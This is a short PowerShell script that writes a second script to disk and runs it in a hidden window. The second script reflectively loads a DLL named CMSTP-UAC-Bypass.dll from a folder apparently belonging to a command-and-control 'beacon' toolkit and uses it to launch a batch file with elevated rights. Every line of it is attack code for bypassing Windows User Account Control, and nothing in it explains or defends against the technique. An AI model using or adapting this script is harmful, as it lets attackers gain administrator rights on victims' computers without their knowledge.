# PowerShell script
$script = @"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\temp\beacon\elevate\CMSTP-UAC-Bypass.dll")) | Out-Null
[CMSTPBypass]::Execute("C:\temp\beacon\elevate\batch.bat") | Out-Null
"@
$script | Out-File -FilePath "C:\temp\CMSTPBypass.ps1" -Encoding ascii

# Execute PowerShell script invisibly
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile", "-WindowStyle", "Hidden", "-File 'C:\temp\CMSTPBypass.ps1'" -NoNewWindow -Wait
